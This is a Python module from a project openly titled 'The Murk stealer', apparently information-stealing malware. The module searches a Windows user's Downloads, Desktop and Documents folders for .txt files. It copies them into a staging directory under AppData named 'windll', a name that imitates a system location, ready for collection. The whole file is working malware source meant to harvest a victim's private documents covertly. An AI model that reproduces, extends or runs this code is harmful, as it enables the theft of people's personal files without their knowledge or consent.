#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import shutil
from manager.logger import Log

def copy_txt_files(source_folder, destination_folder):
	try:
		for root, dirs, files in os.walk(source_folder):
			for file in files:
				if file.endswith('.txt'):
					source_path = os.path.join(root, file)
					destination_path = os.path.join(destination_folder, file)
					shutil.copy2(source_path, destination_path)
	except Exception as error:
		Log(error)

def TxtFiles():
	Log("===========TxtFiles===========")
	path = os.environ['USERPROFILE']

	destination_folder = fr"{path}/AppData/Local/windll/Files/"
	downloads = fr"{path}/Downloads"
	desktop = fr"{path}/Desktop"
	documents = fr"{path}/Documents"

	copy_txt_files(downloads, destination_folder+"Downloads")
	copy_txt_files(desktop, destination_folder+"Desktop")
	copy_txt_files(documents, destination_folder+"Documents")

